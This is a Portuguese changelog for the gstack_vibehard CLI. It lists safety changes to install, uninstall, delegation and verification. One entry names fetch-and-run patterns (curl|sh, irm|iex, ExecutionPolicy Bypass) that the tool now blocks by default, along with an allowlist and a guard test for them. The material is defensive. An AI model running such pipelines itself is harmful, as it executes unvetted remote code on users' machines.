- **`install` agora grava os hooks no MANIFEST** (`refreshHooks` usa `safeCopyFile` em vez de `copyFile`): todo hook instalado/refrescado é **rastreável** → o `uninstall` sempre os reverte. Fecha o gap que deixava a máquina com hooks instalados mas manifest ausente (uninstall incompleto).
- **Novo comando `gstack_vibehard update`** (`src/commands/update.js`): checa a versão instalada vs a última no npm e mostra o comando de atualização (1 linha, idempotente). `--run` atualiza de fato; `--json` para automação; degrada gracioso sem rede.
- **`install --reinstall`/`--force`**: reaplica hooks/config completos (via Safe Write + manifest) mesmo se "já instalado" — conserta install antigo sem desinstalar.
- **Script de aceitação versionado** (`scripts/clean-install-acceptance.ps1` + `.sh`, `npm run test:accept`): roda o veredito de instalação limpa (versão, `--help` seguro, `doctor`, `audit-only` sem escrita, `create` lite sem escrita global) e imprime **PASS/FAIL** por item — repetível a cada update. README documenta o ciclo de reinstalação/atualização.
- +3 testes Node (update: disponível/atualizado/offline). 271 Node + 58 Python verdes; lint/syntaxcheck limpos.

## [3.0.13] - 2026-06-20

### Correções do teste de instalação real (máquina Windows do dono)
- **[BUG] `create` LITE escrevia no global `~/gstack-vault`** (`src/cli/create.js`): o bloco do vault Obsidian rodava sem gate de lite. Agora é **opt-in** (`--full` ou `--vault`); em **lite (padrão) o `create` não escreve NADA global** — só `./<nome>`. Cumpre a promessa do README/PR5. +teste com HOME temp (lite → 0 escrita em `~/gstack-vault`; `--vault` → criado).
- **[ruído] graphify/headroom**: `bootGraphify`/`bootHeadroom` deixam de tentar **baixar via `npx --yes`** e de logar o confuso "Graphify falhou (sem erro)". Agora **só rodam se o binário já estiver instalado**; ausente → mensagem honesta ("opcional, instale `graphify` para ativar"), sem fetch remoto, não-bloqueante.
- **[clareza] conflito OpenCode no `doctor`**: a mensagem deixa explícito que é **config pré-existente do usuário** (o gstack NÃO toca) e aponta o remédio de 1 comando: **`gstack_vibehard doctor --fix`** (merge assistido com backup; `--dry-run` mostra o plano).
- 268 Node + 58 Python verdes; lint/syntaxcheck limpos.

## [3.0.12] - 2026-06-20

### README acessível e coerente com o código (docs)
- Reescrita do `README.md` adotando o tom acessível ("português de gente", tabela problema→solução, "para quem é", analogia, "como funciona na prática") **com claims 100% verificados no código**.
- **Correções de coerência:** todos os comandos usam **`gstack_vibehard`** (underscore — o sugerido usava hífen, que falharia); `create` descrito como **lite por padrão** (`--full` opt-in); test gate marcado como **opt-in** (`GSTACK_TEST_GATE`); RBAC **qualificado** com precisão (`GSTACK_USER_ROLE` viewer/developer/admin no Output Guard pós-resposta, não um RBAC corporativo); sem hipérbole ("não alucina").
- **Bug de manutenção corrigido:** a versão **deixa de ser hardcoded no título** (vinha dessincronizando a cada release) — fonte de verdade agora é o badge npm + CHANGELOG. Removido o bloco de changelog antigo (v2.1.x/v2.2.0) do README.
- Mantido o enquadramento "seguro no primeiro contato" (no-args = ajuda, `install --audit-only`, opt-in global, como desfazer) e toda a referência técnica de comandos com os flags reais. Sem mudança de runtime.

## [3.0.11] - 2026-06-19

### Template smoke + README 5-minutos (PR8 e PR9 do finalprd10.md — fecham o programa)
- **[PR8] `npm run test:templates`** (`scripts/test-templates.mjs`): valida os metadados de cada template (README, `.env.example`, scripts `dev/build/test` coerentes) e cria o **fullstack-monorepo em LITE end-to-end** (scaffold + `.gstack/app.json` mode=lite + `.env.example`). O `install+build` pesado é opt-in (`GSTACK_TEMPLATE_INSTALL=1`). Adicionado `README.md` ao template fullstack (documenta env e o caminho de 5 minutos; `.env.example` já existia).
- **[PR9] README orientado ao primeiro contato**: o topo agora ensina **"começar sem medo em 5 minutos"** (1º comando seguro, criar+rodar app lite, ativar em projeto existente, o que escreve global, como desfazer) — e corrige a **versão dessincronizada** (estava travada em 3.0.4). Histórico vai para o CHANGELOG; arquitetura fica abaixo.
- 267 Node + 58 Python verdes; lint/syntaxcheck limpos; pack smoke e template smoke OK.

> Com isto, os **9 PRs do finalprd10** estão entregues (v3.0.4 → v3.0.11): first-run seguro, help universal, doctor JSON, MCP opt-in, OpenCode plugins manifest-owned, create lite por padrão, política de download remoto, pack smoke, template smoke e README de adoção.

## [3.0.10] - 2026-06-19

### Pack smoke — prova o tarball npm, não a árvore-fonte (PR7 do finalprd10.md)
- **`npm run test:pack`** (`scripts/test-pack.mjs`): empacota (`npm pack --json`), **inspeciona o conteúdo** (falha se houver `node_modules`/`__pycache__`/`.pyc`/`.tgz`), **instala o `.tgz`** num projeto temp e chama o **bin instalado** (não a fonte): `--version`, `--help` (exit 0, sem "Comando desconhecido"), `doctor --json` (JSON puro) e `install --audit-only` (read-only). Cross-platform (npm via `cmd.exe` no Windows; bin via `node <pacote>/src/index.js`).
- **`clean-pkg` agora loga em stderr** (`scripts/clean-pkg.mjs`): não contamina mais `npm pack --json`.
- 267 Node + 58 Python verdes; **pack smoke OK** (698 arquivos, tarball limpo, bin instalado responde).

## [3.0.9] - 2026-06-19

### Política de download remoto — opt-in (PR6 do finalprd10.md)
- **Por padrão o gstack NÃO baixa nem executa scripts remotos** (`src/installer/remote-policy.js`): novo módulo com allowlist de origens HTTPS (`bun.sh`, `sh.rustup.rs`, `astral.sh`, `atomic-vcs.dev`, ...) e `checkRemoteDownload()`. Só executa com opt-in explícito (`--allow-remote-downloads` ou `GSTACK_ALLOW_REMOTE_DOWNLOADS=1`) **E** origem na allowlist.
- **`install` e `create` gateados**: os instaladores remotos (Bun/uv/Rust no `install.js`; Atomic VCS no `create.js`) agora **só rodam com `--allow-remote-downloads`** — caso contrário imprimem a instrução manual e seguem. Fecha o vetor `curl|sh` / `irm|iex` / `ExecutionPolicy Bypass` por padrão.
- **Guard test anti-regressão**: um teste varre `src/` e **falha** se algum arquivo fizer execução remota perigosa (`ExecutionPolicy Bypass`) sem passar pela `remote-policy`.
- +4 testes Node (allowlist HTTPS, default bloqueia/opt-in libera, env, guard). 267 Node + 58 Python verdes; lint/syntaxcheck limpos.

## [3.0.8] - 2026-06-19

### `create` LITE e project-scoped por padrão (PR5 do finalprd10.md)
- **`gstack_vibehard create <nome>` agora é LITE por padrão** (`src/cli/create.js`): escreve **só `./<nome>`** — **sem** Casdoor (Docker), Atomic VCS, ECC2 daemon, AgentMemory federation **nem escrita global** (ex.: `~/.atomic`). Antes provisionava tudo por padrão.
- **`--full`** habilita o stack completo (Casdoor/Atomic/ECC2/...). `--lite` continua válido; em conflito `--lite` vence (mais seguro).
- **`create --dry-run [--json]`**: mostra o plano (modo, diretório, escritas project-scoped vs global, provisionamentos) e **não escreve nada**; `--json` puro.
- **`.gstack/app.json` reflete as capacidades reais**: `mode: lite|full`, e em lite `vcs:"git"`, `mcpGateway:null`, `controlPlane:null`, `iam:"none"` (não mais afirma Casdoor/Atomic/ECC2 que não existem).
- +2 testes Node (default lite só `./app`+mode lite; dry-run não cria diretório); teste do boot completo passa com `--full`. 263 Node + 58 Python verdes; lint/syntaxcheck limpos.

## [3.0.7] - 2026-06-19

### OpenCode plugins manifest-owned + kill switch (PR4 do finalprd10.md)
- **Plugins do OpenCode agora são manifest-owned** (`src/harness/opencode.js`): a cópia dos 3 plugins (`gstack-security/session/prompt.js`) deixa de usar `cpSync(force:true)` e passa por **`safeCopyFile`** → backup versionado + registro no manifest. Plugin **novo** do gstack → `removeOnUninstall` (uninstall remove); plugin **homônimo do usuário** → backup + `restoreOnUninstall` (uninstall restaura o do usuário). Zero resíduo após uninstall.
- **Kill switch `GSTACK_OPENCODE_DISABLE=1`** (`src/plugins/opencode/*.js`): cada plugin retorna sem hooks quando a env var está setada — desliga o comportamento gstack no OpenCode em runtime sem desinstalar.
- +3 testes Node (3 plugins no manifest; backup/restore do homônimo; kill switch). 261 Node + 58 Python verdes; lint/syntaxcheck limpos; manifest real intacto.

## [3.0.6] - 2026-06-19

### MCP global opt-in no Codex (PR3 do finalprd10.md)
- **`install --yes` deixa de escrever `mcp_servers` do gstack no Codex** (`src/harness/codex.js`): o `mergeCodexConfig` agora só injeta os servidores MCP quando `mcp:true` (via `--global-mcp`/`--global`). Antes adicionava fallow/supabase/playwright/context7/etc. sempre — inclusive placeholders como `${SUPABASE_PROJECT_REF}`. Hooks e config do usuário continuam preservados.
- **`--mcp-server <name>`** (repetível ou CSV): com `--global-mcp`, escreve **só** os servidores escolhidos (ex.: `--global-mcp --mcp-server playwright` → só Playwright, sem placeholders de Supabase/Context7).
- `installCodex({ mcp, mcpServers })` + parsing de `--mcp-server` no `install.js`.
- +2 testes Node (opt-out default sem MCP; `--mcp-server` único) e testes existentes ajustados p/ a nova assinatura. 258 Node + 58 Python verdes; lint/syntaxcheck limpos.

## [3.0.5] - 2026-06-19

### Doctor JSON + resiliência (PR2 do finalprd10.md)
- **`doctor --json` agora é JSON PURO** (`src/installer/doctor.js`): novo coletor `collectDoctorJson()` (determinístico, sem banner/prosa/ANSI) com versões, harnesses, componentes, MCP global, OpenCode, Playwright, deps, integridade e impacto. `--impact --json` e `--install-integrity --json` também retornam estruturado.
- **`doctor --strict --json`** → exit≠0 se um check obrigatório falha (Node/Python ausente ou manifest com problema).
- **EPERM/EACCES-safe**: todo scan de filesystem (incl. a pasta de browsers do Playwright) usa `safeReaddir` → vira **warning, nunca crash**.
- +4 testes Node (JSON puro, estrutura, EPERM-safe, strict exit≠0 com manifest problemático). 256 Node + 58 Python verdes; lint/syntaxcheck limpos.

## [3.0.4] - 2026-06-19

### First-run seguro + help universal (PR1 do finalprd10.md)
Corrige as falhas de **primeiro contato** que faziam o CLI parecer arriscado:
- **`gstack_vibehard` sem argumentos NÃO instala mais** (`src/index.js`): mostra ajuda curta e sugere `gstack_vibehard start` (exit 0, zero escrita). Antes caía em `install` por padrão.
- **Help universal** (`src/cli/index.js`): `--help`/`-h`/`help`/`help <comando>`/`help advanced` e **`<comando> --help`** mostram ajuda e **nunca executam** o comando (ex.: `install --help` não instala mais). `--help` deixa de virar "Comando desconhecido".
- **Banner único**: o `help` não duplica mais o banner (removido o `logo()` redundante do `showHelp`).
- **`--no-color`** (e `NO_COLOR`): suprime as sequências ANSI — saída limpa p/ logs/pipes.
- **Ajuda em 2 níveis**: curta (start/create/init/status/enable/disable/doctor/verify/install/uninstall/help) + `help advanced` (tools/context/delegate/workflow/a2a/dream/proxy/monitor/publish-guard/...), com `<cmd> --help` por comando — tudo a partir de um **registro único** de comandos.
- +7 testes Node (no-args não instala/não escreve, help exit 0, banner único, install --help não instala, --no-color). 252 Node + 58 Python verdes; lint/syntaxcheck limpos.

## [3.0.3] - 2026-06-19

### Ajuste Final P0 — QG consistente, verify rápido, audit read-only, E2E (PRD PRDAJUSTEFINAL.MD)
- **[P0.1] QG versionado + drift-aware + sem npx lento** (`hooks/hooks/qg.py`, `src/project-plan/verify-runner.js`): o `qg.py` ganha `QG_VERSION` e emite `qg_version`/`qg_hash` em **todo** caminho; resolve o Fallow preferindo **binário local** (`node_modules/.bin/fallow` → global → `npx` fallback), evitando o cold-start; modo `--strict`/`GSTACK_QG_STRICT=1` → Fallow ausente vira `tool_missing`/exit≠0 (nunca pass silencioso em CI/release). O `verify` agora reporta `qg={origin,path,version,hash}` e **detecta drift** entre o qg instalado e o **empacotado** → `qgDrift` + `ready_with_warnings` (não "ready" silencioso). `--profile release` roda o qg empacotado (consistência garantida).
- **[P0.2] `verify --quick` + cache** (`src/project-plan/verify-runner.js`, `src/commands/verify.js`): perfil `quick` (deps via checagem filesystem, lint, diff-hygiene, QG L1 advisory com timeout 15s) roda em **~8s** (era ~163s no full). Cache por fingerprint de arquivos (`.gstack/verify-cache.json`) → 2ª run sem mudanças = `cache_hit`. Perfil `release` torna o publish-guard bloqueante. `--json` puro no final.
- **[P0.3] `install --audit-only` literalmente READ-ONLY** (`src/installer/install.js`): por padrão **não escreve nada** (só stdout); `--save-report` grava o relatório e avisa o efeito.
- **[P0.4] E2E em HOME descartável** (`tests/e2e/safe-install.e2e.test.js`, `npm run test:e2e`, gated por `GSTACK_E2E_SAFE_INSTALL=1`): prova as invariantes de segurança — audit-only não escreve nada, `--save-report` grava exatamente 1 arquivo, `delegate --worktree` bloqueia `.env` rastreado, uninstall preserva drift (e só sobrescreve com `--resolve-drift`) — tudo num HOME temporário, sem tocar a máquina real.
- **[P0.5] Mensagem do `publish-guard`**: quando a tag da versão já existe, o `detail` orienta (nova release → bump; validação local → publish é advisory no verify).
- +9 testes (Node verify drift/quick/cache + Python qg strict/version + E2E). 245 Node + 58 Python verdes; lint/syntaxcheck limpos.

## [3.0.2] - 2026-06-19

### Fechamento de qualidade — auditoria 4 pontos (rumo ao 10/10)
- **[qg.py] Timeout robusto + JSON garantido** (`hooks/hooks/qg.py`): o Fallow agora roda via `Popen` em grupo/sessão própria; no timeout o gstack **mata a árvore inteira** (`taskkill /T` no Windows, `killpg` no POSIX) — antes o `--timeout` não cortava em cache frio do `npx` porque netos seguravam o pipe (trava >60s no Windows). Em timeout, o JSON de erro é **sempre** emitido.
- **[delegação] Staging por ALLOWLIST** (`src/delegation/worktree.js`): `commitWorktree` deixa de usar `git add -A`. Agora lista o `git status --porcelain` e adiciona **explicitamente** só os arquivos elegíveis (exclui `.env`, build/saídas, binários; mantém lockfiles). `isExcludedFromCommit` exportada e testada. Não força commit quando só há excluídos.
- **[autosave] `--no-verify` agora é OPT-IN** (`hooks/hooks/git_worktree_autosave.py`): por padrão **respeita os hooks de pre-commit**; só pula com `GSTACK_AUTOSAVE_NO_VERIFY=1`.
- **[README] Claims 100% alinhados ao código**: versão do topo atualizada; `delegate` **bloqueia** `.env` rastreado (antes dizia "avisa"); a afirmação de "`git add -A` removido / staging explícito" agora é **verdadeira** (delegação + autosave usam allowlist).
- +2 testes Node (allowlist staging; sem commit quando só excluídos). 241 Node + 56 Python verdes; lint/syntaxcheck limpos.
- Nota honesta: o `verify` usa o `qg.py` **instalado** (`~/.codex`/`~/.gstack`), que reflete o ambiente real do usuário; ele fica em sincronia com o pacote ao rodar `gstack_vibehard install` (atualiza hooks obsoletos). Itens do `dream audit` (Output Guard, Auto-dream, Zero-Trust) seguem honestamente como PARTIAL/RISK no roadmap.

## [3.0.1] - 2026-06-19

### Pacote npm estado-da-arte — sem artefatos Python no tarball
- O `files` (allowlist) incluía `__pycache__/*.pyc` gerados localmente sob `hooks/`/`src/` no tarball publicado (ruído inofensivo, mas não-limpo). Agora um hook **`prepack`** (`scripts/clean-pkg.mjs`) remove todo `__pycache__`/`.pyc`/`.pyo` automaticamente antes de cada `npm pack`/`npm publish` → o pacote sai **100% limpo, sempre**. Também exposto como `npm run clean`.

## [3.0.0] - 2026-06-19

### Safe & adaptive by default — flip do default do `install` (Fases 5–6, fecha o master plan)

**BREAKING CHANGES (instalação):**
- **`install` é preflight-first:** antes de qualquer escrita global, mostra o impacto por categoria e **exige confirmação**. Em modo **não-interativo** agora exige `--yes` (ou `--global`) — antes instalava direto. Migração: use `gstack_vibehard install --yes` (completa) ou `--project-only --yes` (impacto mínimo).
- **MCP global é opt-in:** o `install` **não escreve mais MCP global por padrão** — use `--global-mcp` (ou `--global`). Antes era escrito automaticamente. (Codex AC8.)

**Honestidade & docs (Fase 5):**
- `npm run syntaxcheck` (novo nome honesto; `typecheck` mantido como alias) — deixa claro que é checagem de **sintaxe ESM** (`node --check`), não TypeScript.
- README: seção de Safe Install (preflight/`--audit-only`/`--project-only`/`--harness`/`--global-mcp`), nota de honestidade dos scripts, ponteiros de auditoria/rollback.

**Fecha o master plan `entregafinal.md`:** AC1–AC8 do Codex cobertas; duas camadas (contexto/identidade + checks determinísticos por arquétipo) entregues; tudo testado de ponta a ponta sem tocar a máquina real (DI de `home`/`exec`), com a invariante de md5 do manifest.
- +1 teste Node (MCP opt-in no impacto). 240 Node + 56 Python verdes; lint/syntaxcheck limpos.

## [2.32.0] - 2026-06-19

### Delegação que não vaza segredo + uninstall que não perde sua edição (Fase 4)
- **[AC6] Commit delegado verificado** (`src/delegation/worktree.js`, `src/delegation/opencode.js`): o `commitWorktree` agora exclui do staging também **build/saídas pesadas** (`dist`, `build`, `.next`, `out`, `coverage`, `node_modules`) além do `.env`. Antes de marcar o branch como revisável, roda **`diff-hygiene` determinística** nos arquivos alterados; achado **HIGH** (segredo/`debugger`) → status **`needs_review`** (não `ok`), com os achados listados. `delegate` instrui a revisar antes de mergear.
- **[AC7] Uninstall drift-safe** (`src/installer/uninstall.js`): antes de restaurar um backup, compara o hash atual do arquivo com o `installedHash` do manifest. Se você **editou o arquivo depois da instalação**, o restore é **PULADO** (sua edição é preservada) — a menos de `gstack_vibehard uninstall --resolve-drift`.
- **`doctor --impact`** (`src/installer/doctor.js`): mostra os **componentes globais ativos** por categoria (hooks, config de harness, MCP global, skills/scripts, vault) e avisa o que afeta qualquer projeto; aponta o rollback.
- +6 testes Node (needs_review na delegação, drift-safe + resolve-drift, impacto). 239 Node + 56 Python verdes; lint/typecheck limpos.

## [2.31.0] - 2026-06-19

### Safe Install — preflight de impacto e instalação de impacto mínimo (Fase 3, bloqueador de produção do Codex)
Responde ao P1 do `FINALPRODUCAO.MD`: o `install` deixa de ser global-first cego.
- **`install --audit-only`** (AC2): preflight que **lista, por categoria, os caminhos globais** que seriam criados/modificados (`[create]`/`[modify]`) — **sem escrever nada** — e salva `~/.gstack_vibehard/install-report-<ts>.md`. Provado: o manifest real fica intacto.
- **`install --project-only`**: impacto global mínimo — pula deps globais, **MCP global**, e o vault Obsidian (mantém hooks + config dos harnesses).
- **`install --harness <claude|opencode|cursor|codex>`**: instala só um harness (ativação incremental).
- **`buildInstallImpact()` / `renderImpactMarkdown()`** (`src/installer/impact.js`): função pura (home injetável) que enumera o impacto por categoria — base testável do preflight e do relatório.
- **Mensagem final precisa** (Codex §6 P2): admite que componentes globais foram registrados e aponta `doctor --install-integrity` + `uninstall --dry-run`.
- +5 testes Node (impacto por categoria, project-only, filtro de harness, modify vs create). 236 Node + 56 Python verdes; lint/typecheck limpos.

## [2.30.0] - 2026-06-18

### QG honesto por severidade + dial de token nas duas camadas (Fases 1–2 do master plan)
- **[Fallow ciente de severidade] `qg.py`** (`hooks/hooks/qg.py`): o Quality Gate deixa de reprovar a entrega por achado **MÉDIO/auto-fixable** (ex.: "remove unused export"). Agora **só CRÍTICO/ALTO bloqueiam** (`BLOCKING_SEVERITIES`), alinhado ao `stop.py` (`blocked = critical>0 or high>0`). Aceita `--profile <arquétipo>` (contrato de ruleset por arquétipo). Resolve o falso-positivo que reprovava o próprio repo (lib/CLI) por questão de baixo risco. Fallow ausente continua **pulando sem bloquear** (peer dep opcional).
- **[Dial de token — Camada A] `.gstack/profile.json` → `tokenBudget`** (`hooks/hooks/_paths.py` `read_project_profile`/`token_budget`; aplicado em `session_start.py` e `stop.py`): `minimal` = loop barato (sem injeção de identidade/chronicle/frameworks pesados); `standard` (default) = enxuto (sem MOM basal); `full` = comportamento atual. **A camada de contexto/identidade/memória continua disponível** — só deixa de ser sempre "full". Fail-open → `standard`.
- +8 testes (2 Python qg severidade, 6 Python dial de token). 231 Node + 56 Python verdes; lint/typecheck limpos.
- Nota: a cópia **instalada** do `qg.py` (`~/.codex/hooks`) atualiza ao reinstalar (`gstack_vibehard install` atualiza hooks obsoletos) — o fonte versionado é o que entra na release.

## [2.29.0] - 2026-06-18

### Núcleo de arquétipo — checks determinísticos que cabem em QUALQUER projeto (Fase 1 do master plan `entregafinal.md`)
O gstack passa a **detectar o tipo do projeto** e a entregar valor determinístico (de graça em tokens) a repos que não são site/SaaS — começando pelo próprio repo dele (uma lib/CLI npm).
- **`detectProfile()`** (`src/project-plan/detect-profile.js`): classificação determinística (sem LLM, sem rede) em `library | cli | web-app | service | mobile-backend | data-ml | monorepo | unknown`, a partir de `package.json` + presença de arquivos. Base que adapta gates e regras ao arquétipo.
- **`publish-guard`** (`src/project-plan/publish-guard.js` + comando `gstack_vibehard publish-guard`): o ritual de release automatizado e determinístico — working tree limpa, versão bumpada vs última tag, CHANGELOG com entrada, tag, CI verde (via `gh`, opcional). Exit ≠0 em pendência HARD. `--json`, `--no-ci`.
- **`diff-hygiene`** (`src/project-plan/diff-hygiene.js`): varredura só dos arquivos mudados (git) — `debugger`, segredo hardcoded (AWS/GitHub/Slack/chave privada), `.only`/`.skip` em teste, catch vazio, TODO/FIXME. **Não** flagra `console.log` (numa CLI o stdout é o produto).
- **`verify` ciente de arquétipo** (`src/project-plan/verify-runner.js`): para lib/CLI roda publish-guard + diff-hygiene como gates **advisory** (reportam, nunca bloqueiam) e marca runtime/preview como `not_applicable` (não se aplica a lib/CLI). Mostra o arquétipo no relatório.
- **Adoção observe-only** (`src/commands/activate.js`): `enable` detecta o arquétipo e grava `.gstack/profile.json` `{profile, mode:"observe", tokenBudget:"standard"}` — em modo observe os gates reportam e nunca bloqueiam.
- +26 testes Node (detecção por arquétipo, publish-guard, diff-hygiene, comando, profile.json). 231 Node + 48 Python verdes; lint/typecheck limpos.
- Nota honesta: o gate QG (Fallow) ainda bloqueia em achados MÉDIO/auto-fixable; torná-lo ciente de arquétipo (bloquear só CRÍTICO/ALTO) está na próxima etapa da Fase 1.

## [2.28.1] - 2026-06-18

### Patch de segurança (code review da v2.28.0)
- **[crítico] Delegação SEM `--worktree` não bloqueava `.env` rastreado.** O bloqueio de segredo da v2.28.0 ficava dentro de `if (flags.worktree)`, mas a delegação **padrão** (sem `--worktree`) roda `opencode run` no **diretório real** — a outra IA lia o `.env` direto do disco, sem nenhum bloqueio. Era o caminho mais exposto e o default. Agora o bloqueio guarda **toda** delegação (`src/commands/delegate.js`): `.env` rastreado → BLOQUEADO em ambos os modos (libere com `--allow-tracked-secrets`).
- **[robustez] `enable` avisa sobre `.gstack-disabled/` residual** quando o projeto já está ativo (antes ignorava o resíduo silenciosamente).
- +2 testes Node (bloqueio no modo sem worktree; aviso de resíduo). 205 Node + 48 Python verdes; lint/typecheck limpos.

## [2.28.0] - 2026-06-18

### Ligar/desligar o gstack POR PROJETO (claro) + delegação não vaza segredos
Fecha a dúvida do dono: "como ativo/desativo o gstack num projeto que já está rodando?". Antes, "ativar" era efeito colateral de `context init` — nada óbvio. Agora há comandos diretos, e projetos em andamento ficam **intocados** até você decidir.
- **`gstack_vibehard enable` / `disable` / `status`** (`src/commands/activate.js`): controle explícito por projeto. O marcador é a pasta `.gstack/` (o que os hooks já checam via `is_gstack_project`). `disable` **preserva os dados** renomeando `.gstack/` → `.gstack-disabled/` (hooks ficam passivos); `enable` recria ou **reativa** preservando contexto/planos; `status` mostra ATIVO / DESATIVADO / INATIVO. Não sobrescreve em conflito.
- **Modelo de ativação na mensagem do `install`:** o gstack vem **ATIVO por padrão em projetos NOVOS** (`create`) e **DESATIVADO em projetos em andamento** — ativar com `enable`. Projeto que você não ativar fica intocado (só o bloqueio de comando destrutivo continua global, como rede de segurança).
- **[P1] Delegação BLOQUEIA `.env` rastreado** (`src/commands/delegate.js`): com `--worktree`, se houver `.env` versionado no git, o gstack **não delega** (a outra IA veria seus segredos no checkout da worktree) — instrui a corrigir (`git rm --cached .env`) ou liberar explicitamente com `--allow-tracked-secrets`. Antes só avisava.
- **[P1] Commit delegado não vaza segredos** (`src/delegation/worktree.js` `commitWorktree`): removido `--no-verify` (respeita os hooks de pre-commit do usuário) e o staging agora **exclui `.env`/`.env.*`** — o branch revisável nunca contém o `.env`.
- +9 testes Node (toggle enable/disable/status com preservação de dados; bloqueio/override de delegação; higiene do commit). 203 Node + 48 Python verdes; lint/typecheck limpos.

## [2.27.0] - 2026-06-18

### Infra global, ATIVAÇÃO por projeto — seguro para máquina com vários projetos
Responde "instalar o gstack põe meus projetos em andamento em risco?": agora **não**. A infra é instalada globalmente, mas as **regras gstack só ativam em projetos com `.gstack/`**.
- **Helper único `find_gstack_root()`/`is_gstack_project()`** (`hooks/hooks/_paths.py`): sobe a árvore procurando `.gstack/`. **Ignora o home** — `~/.gstack` é o dir GLOBAL, não marcador de projeto (senão todo projeto sob a home pareceria gstack-ativo).
- **Ativação por projeto:** `stop.py` (chronicle/gates/sandbox), `session_start.py` (identidade/quality-bar) e `user_prompt_submit.py` (hints) **só agem em projeto gstack**. Projeto alheio sem `.gstack/` → o gstack não interfere. (Só o bloqueio de comando destrutivo continua global, como rede de segurança.)
- **Hooks fail-OPEN:** `pre_tool_use_security.py` (e demais hooks globais) nunca crasham/travam o turno — input malformado → `exit 0` (libera). Corrige `json.loads(stdin)` sem try/except que podia bloquear Write/Edit/Bash em qualquer projeto.
- **`~/CLAUDE.md` auto-escopado:** o bloco global instrui o agente a aplicar as regras gstack **só** em projetos `.gstack/`; fora deles, comportar-se normalmente.
- **Mensagem do `install`** explica a ativação por projeto (`context init` p/ ativar projeto existente; `create` p/ novo) + rollback.
- +10 testes Python (gate por projeto + fail-open + destrutivo global). 194 Node + 48 Python verdes; lint/typecheck limpos.

## [2.26.0] - 2026-06-18

### Hardening de produto (correções da revisão)
- **[crítico] Isolamento de teste do manifest:** o guard `underHome` usava só `startsWith(home)`, mas no Windows `tmpdir()` fica **sob** `homedir()` — então rodar `npm test` gravava/corrompia o `~/.gstack_vibehard/install-manifest.json` **real** do desenvolvedor. Novo `shouldRecordManifest` só registra quando o `home` é explícito (intenção do caller) **ou** o caminho **não** está sob `tmpdir()`. Prova: o md5 do manifest real fica idêntico antes/depois da suíte.
- **`safeCopyDir` restaurável:** cada arquivo interno do usuário sobrescrito agora é registrado no manifest como item **restaurável** (`restoreOnUninstall:true` + backup) — antes só o dir pai era registrado e o uninstall não restaurava arquivos internos.
- **Auto Dream honesto:** o bloco escrito no `CLAUDE.md` deixou de afirmar "Auto-dream ON" → agora "**Dream audit ON** — auto-improve (worktree/verify/accept-reject) no roadmap". `dream status` idem.
- **uninstall — fallback legado seguro:** sem manifest, remover skill por **nome** (risco de colisão com a do usuário) agora exige `--legacy-name-cleanup`; por padrão avisa e **não remove**.
- +2 testes (`shouldRecordManifest`, `safeCopyDir` restaurável); 194 Node + 38 Python verdes; lint/typecheck limpos.

## [2.25.0] - 2026-06-18

### Contrato de confiança (3/3) — proxy de interceptação real (opt-in) + higiene de worktree
- **`gstack_vibehard proxy`** (`src/security/redact-proxy.js`): proxy reverso **opt-in** que redige a **resposta do modelo antes de chegar ao harness/tela** — a única forma honesta de "interceptação em trânsito" a partir de uma CLI. Aponte `ANTHROPIC_BASE_URL`/`OPENAI_BASE_URL` para ele. **Honesto:** só funciona onde o harness aceita base-URL custom (não é universal); SSE é best-effort por linha. Reusa a lib única de redaction.
- **Higiene de worktree** (`checkTrackedSecrets`): o gstack **não copia `.env`** para worktrees (usa `git worktree add` puro; autosave exclui `.env`; não existe `.worktreeinclude`). O risco real é ter `.env` **rastreado** no git — `delegate --worktree` agora **avisa** se detectar. README atualizado desmentindo o mito do `.worktreeinclude`.
- README §Segurança: documenta redaction do GitOps, higiene de worktree e o caminho honesto de interceptação (proxy opt-in vs Output Guard pós-resposta).
- +6 testes (192 Node + 38 Python verdes; lint/typecheck limpos). Fecha o contrato de confiança (Fase 3 honesta completa).

## [2.24.0] - 2026-06-18

### Contrato de confiança (2/3) — create project-scoped + status honestos
- **`create` agora é PROJECT-SCOPED:** parou de escrever config GLOBAL (`~/.config/opencode/hooks.json`, `~/.claude/settings.json`) — era a causa do EPERM e tocava o ambiente global sem manifest/backup. A config global de harness é responsabilidade do `install`. (Bônus: o `hooks.json` do OpenCode estava errado — OpenCode usa plugins.)
- **`verify` honesto p/ automação:** `ready` agora é **estrito** (só `true` quando tudo aplicável passou, sem `tool_missing`); novo campo **`usable`** = sem blockers (mas pode faltar Fallow/QG). Consumidor que olha só `ready` não libera fluxo sem ferramenta de confiança.
- **`workflow run` instruction-only ≠ `passed`:** quando nenhum trabalho real é executado (delegação OFF), o status vira **`instructed`** (não `passed`) — não engana o usuário leigo. Resume (journal_hit) e worker custom contam como executado.
- **`build_agents.js`** usa `execFileSync` com array (sem shell/string); **`typecheck`** roda check de parse REAL (`node --check`), rotulado honestamente (ESM puro, sem TS) — fim do placebo que sempre passava.
- Testes atualizados ao novo contrato (186 Node + 38 Python verdes; lint/typecheck limpos).

## [2.23.0] - 2026-06-17

### Contrato de confiança unificado (1/3) — toda escrita global via safe-write + uninstall restaurativo
Fecha a dívida apontada na revisão: "a camada de confiança estava dividida (parte manifest/safe-write, parte escrevia por fora)".
- **`merge.js` agora delega ao safe-write:** `writeWithBackup`/`copyWithBackup`/`copyDirSync` passam por `safeWriteFile`/`safeCopyFile`/`safeCopyDir` (backup versionado + **registro no manifest** com componente inferido). Isso migra **claude, codex, headroom** de uma vez, sem reescrever cada caller.
- **`install.js` (vault + `~/.codex/.env`) e `hermes.js` (config.yaml/snippet)** passam por safe-write. O `.env` usa **bloco marcado** (`safeAppendBlock`); o vault é registrado mas **preservado** (`removeOnUninstall:false`).
- **Guard `underHome`:** o manifest só registra escrita GLOBAL (sob o home) — escrita em projeto/temp faz backup+atômica sem poluir o manifest (e sem poluir o `~` real em testes).
- **uninstall NORMAL agora restaura via manifest** (originais `.gstack_vibehard.bak`) **ANTES** de remover qualquer coisa; o manifest é apagado por último. Antes o restore real só rodava em `--restore-only`.
- **`doctor --fix` não-destrutivo:** escreve o merge via safe-write (manifest) e **preserva o `.jsonc`** renomeando para `.jsonc.gstack-disabled` (não apaga mais).
- +2 testes; suíte intacta (186 Node + 38 Python verdes; lint limpo).

## [2.22.0] - 2026-06-17

### Fase 3 (3/3) — Trust fixes + OpenCode JSONC doctor
